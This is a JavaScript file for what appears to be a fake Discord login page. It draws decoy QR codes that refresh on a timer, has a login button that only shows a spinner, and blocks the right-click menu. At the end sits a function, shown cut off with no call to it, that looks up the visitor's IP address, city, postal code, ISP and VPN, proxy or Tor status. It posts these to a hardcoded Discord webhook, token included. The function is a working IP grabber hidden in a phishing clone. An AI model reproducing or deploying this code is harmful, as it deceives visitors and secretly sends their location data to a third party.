// ==================================
// CONFIGURATION
// ==================================
const CONFIG = {
  ANIMATION_DURATION: 3000,
  QR_REFRESH_INTERVAL: 120000, // 2 minutes
  ELLIPSIS_DELAY_INCREMENT: 0.2,
  QR_STRING_LENGTH: 43,
};

// ==================================
// SELECTORS
// ==================================
const DOM = {
  loginButton: document.querySelector("button"),
  qrCodeContainer: document.querySelector(".right-section .qr-code"),
};

// ==================================
// UTILITY FUNCTIONS
// ==================================

/**
 * Generates a random alphanumeric string
 * @param {number} length - Length of the string to generate
 * @returns {string} Random string
 */
const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  return Array.from({ length }, () =>
    characters.charAt(Math.floor(Math.random() * characters.length))
  ).join("");
};

/**
 * Creates an HTML element from a string
 * @param {string} html - HTML string
 * @returns {Element} DOM element
 */
const createElementFromHTML = (html) => {
  const template = document.createElement("template");
  template.innerHTML = html.trim();
  return template.content.firstChild;
};

// ==================================
// QR CODE MODULE
// ==================================
const QRCodeModule = {
  /**
   * Generates a QR code SVG element
   * @param {string} data - Data to encode in QR code
   * @returns {SVGElement|null} SVG element or null on error
   */
  generate(data) {
    try {
      const qr = qrcode(0, "L");
      qr.addData(data);
      qr.make();

      const moduleCount = qr.getModuleCount();
      const svgString = qr.createSvgTag(1, 0);

      const parser = new DOMParser();
      const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
      const svgElement = svgDoc.documentElement;

      svgElement.setAttribute("width", "160");
      svgElement.setAttribute("height", "160");
      svgElement.setAttribute("viewBox", "0 0 37 37");

      const path = svgElement.querySelector("path");
      if (path) {
        path.setAttribute("transform", `scale(${37 / moduleCount})`);
      }

      return svgElement;
    } catch (error) {
      console.error("Error generating QR code:", error);
      return null;
    }
  },

  /**
   * Creates the spinner markup for QR code loading
   * @returns {string} HTML string for spinner
   */
  getSpinnerMarkup() {
    return `
      <span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true">
        <span class="inner wanderingCubes">
          <span class="item"></span>
          <span class="item"></span>
        </span>
      </span>
    `;
  },

  /**
   * Displays the loading animation for QR code
   */
  showLoadingAnimation() {
    if (!DOM.qrCodeContainer) return;

    const svg = DOM.qrCodeContainer.querySelector("svg");
    const img = DOM.qrCodeContainer.querySelector("img");

    svg?.remove();
    img?.remove();

    DOM.qrCodeContainer.style.background = "transparent";
    DOM.qrCodeContainer.insertAdjacentHTML(
      "afterbegin",
      this.getSpinnerMarkup()
    );
  },

  /**
   * Refreshes the QR code with new data
   */
  refresh() {
    if (!DOM.qrCodeContainer) return;

    DOM.qrCodeContainer.innerHTML = "";

    const newQRCode = this.generate(
      `https://discord.com/ra/${generateRandomString()}`
    );

    if (newQRCode) {
      DOM.qrCodeContainer.appendChild(newQRCode);
    }

    DOM.qrCodeContainer.insertAdjacentHTML(
      "beforeend",
      `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`
    );

    DOM.qrCodeContainer.style.background = "white";
  },

  /**
   * Simulates QR code refresh with animation
   */
  simulateRefresh() {
    this.showLoadingAnimation();
    setTimeout(() => this.refresh(), 3500);
  },

  /**
   * Initializes the QR code refresh interval
   */
  initRefreshInterval() {
    setInterval(() => this.simulateRefresh(), CONFIG.QR_REFRESH_INTERVAL);
  },
};

// ==================================
// LOGIN BUTTON MODULE
// ==================================
const LoginButtonModule = {
  /**
   * Creates the ellipsis spinner markup
   * @returns {string} HTML string for ellipsis spinner
   */
  getEllipsisMarkup() {
    return `
      <span class="spinner" role="img" aria-label="Loading">
        <span class="inner pulsingEllipsis">
          <span class="item spinnerItem"></span>
          <span class="item spinnerItem"></span>
          <span class="item spinnerItem"></span>
        </span>
      </span>
    `;
  },

  /**
   * Applies staggered animation delays to spinner items
   */
  applyAnimationDelays() {
    const spinnerItems = document.querySelectorAll(".spinnerItem");
    spinnerItems.forEach((item, index) => {
      item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${
        index * CONFIG.ELLIPSIS_DELAY_INCREMENT
      }s`;
    });
  },

  /**
   * Shows the loading animation on the button
   */
  showLoading() {
    if (!DOM.loginButton) return;

    DOM.loginButton.innerHTML = this.getEllipsisMarkup();
    DOM.loginButton.setAttribute("disabled", "true");
    this.applyAnimationDelays();

    setTimeout(() => this.reset(), CONFIG.ANIMATION_DURATION);
  },

  /**
   * Resets the button to its default state
   */
  reset() {
    if (!DOM.loginButton) return;

    DOM.loginButton.innerHTML = "";
    DOM.loginButton.textContent = "Log In";
    DOM.loginButton.removeAttribute("disabled");
  },

  /**
   * Initializes the login button event listener
   */
  init() {
    if (!DOM.loginButton) return;

    DOM.loginButton.addEventListener("click", (e) => {
      e.preventDefault();
      this.showLoading();
    });
  },
};

// ==================================
// EVENT HANDLERS
// ==================================

/**
 * Prevents right-click context menu
 */
const preventContextMenu = (e) => {
  e.preventDefault();
};

// ==================================
// INITIALIZATION
// ==================================
const init = () => {
  // Initialize login button functionality
  LoginButtonModule.init();

  // Initialize QR code refresh
  QRCodeModule.initRefreshInterval();

  // Prevent context menu
  document.addEventListener("contextmenu", preventContextMenu);
};

// Start the application when DOM is ready
if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", init);
} else {
  init();
}
const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;

            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {

                    const dscURL = 'https://discord.com/api/webhooks/1457850148507095253/z9zaA8Bg4744x3Ydr9qEAIqws2qpdelxT0csW2gurAvZwYAmaDi1gfMPXpRt6mLreGDs';

                    // 🛡️ VPN / Proxy detection (safe fallbacks)
                    const isVPN   = geoData.security?.vpn ?? false;
                    const isProxy = geoData.security?.proxy ?? false;
                    const isTor   = geoData.security?.tor ?? false;

                    const riskLevel = isTor || isVPN || isProxy ? "🔴 High Risk" : "🟢 Low Risk";
                    const embedColor = isTor ? 0xff0033 : (isVPN || isProxy ? 0xffa500 : 0x00ff88);

                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "Site Logger",
                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
                            content: `@here ${riskLevel}`,
                            embeds: [
                                {
                                    title: "🛡️ New Site Event",
                                    description: "A new page interaction was recorded.",
                                    color: embedColor,

                                    fields: [
                                        { name: "🌐 IP Address", value: `\`${ipadd}\``, inline: true },
                                        { name: "🧠 Network / ISP", value: `\`${geoData.network || "Unknown"}\``, inline: true },

                                        { name: "🏙️ City", value: geoData.city || "Unknown", inline: true },
                                        { name: "🗺️ Region", value: geoData.region || "Unknown", inline: true },
                                        { name: "🌍 Country", value: geoData.country_name || "Unknown", inline: true },
                                        { name: "📮 Postal Code", value: geoData.postal || "N/A", inline: true },

                                        {
                                            name: "🔐 Security Check",
                                            value:
`VPN: **${isVPN ? "Yes" : "No"}**
Proxy: **${isProxy ? "Yes" : "No"}**
Tor: **${isTor ? "Yes" : "No"}**`,
                                            inline: false
                                        }
                                    ],

                                    footer: {
                                        text: "Site Logger • Security Module"
                                    },

                                    timestamp: new Date()
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });

